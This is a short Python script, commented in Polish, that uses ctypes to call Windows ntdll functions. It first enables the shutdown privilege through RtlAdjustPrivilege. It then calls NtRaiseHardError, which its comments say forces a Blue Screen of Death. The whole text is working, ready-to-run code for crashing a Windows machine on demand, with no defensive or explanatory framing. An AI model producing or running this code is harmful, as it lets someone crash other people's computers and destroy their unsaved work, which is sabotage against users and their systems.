import ctypes

# 1. Tworzymy instancje zmiennych
enabled = ctypes.c_bool()
response = ctypes.c_uint()

# 2. Przekazujemy instancje do funkcji za pomocą byref()
# RtlAdjustPrivilege: 19 to SeShutdownPrivilege
ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))

# NtRaiseHardError wywoła Blue Screen of Death (BSOD)
ctypes.windll.ntdll.NtRaiseHardError(0xC0000001, 0, 0, 0, 6, ctypes.byref(response))
